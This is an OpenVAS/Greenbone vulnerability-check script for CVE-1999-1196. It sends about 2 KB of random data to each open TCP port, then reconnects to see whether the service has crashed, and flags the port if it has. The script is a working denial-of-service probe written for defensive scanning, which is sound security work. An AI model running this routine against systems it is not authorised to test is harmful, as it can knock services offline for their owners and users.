# SPDX-FileCopyrightText: 2005 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.17296");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/158");
  script_cve_id("CVE-1999-1196");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Kill service with random data");
  # Maybe we should set this to ACT_DESTRUCTIVE_ATTACK only?
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2005 Michel Arboi");
  script_family("Denial of Service");
  script_mandatory_keys("TCP/PORTS");
  script_dependencies("find_service.nasl", "find_service2.nasl", "secpod_open_tcp_ports.nasl");

  script_tag(name:"solution", value:"Upgrade your software or contact your vendor and inform it of this
  vulnerability.");

  script_tag(name:"summary", value:"It was possible to crash the remote service by sending it
  a few kilobytes of random data.");

  script_tag(name:"impact", value:"An attacker may use this flaw to make this service crash continuously,
  preventing this service from working properly. It may also be possible
  to exploit this flaw to execute arbitrary code on this host.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");

beurk = '';
for( i = 0; i < 256; i ++ ) {
  beurk = strcat( beurk,
  ord(rand() % 256), ord(rand() % 256), ord(rand() % 256), ord(rand() % 256),
  ord(rand() % 256), ord(rand() % 256), ord(rand() % 256), ord(rand() % 256) );
 # 2 KB
}

port = tcp_get_all_port();

soc = open_sock_tcp( port );
if( soc ) {

  send( socket:soc, data:beurk );
  close(soc);

  # Is the service still alive?
  # Retry just in case it is rejecting connections for a while
  for( i = 1; i <= 3; i ++ ) {
    soc = open_sock_tcp( port );
    if( soc ) break;
    sleep( i );
  }
  if( ! soc ) {
    security_message( port:port );
  } else {
    close( soc );
  }
}

exit( 0 );
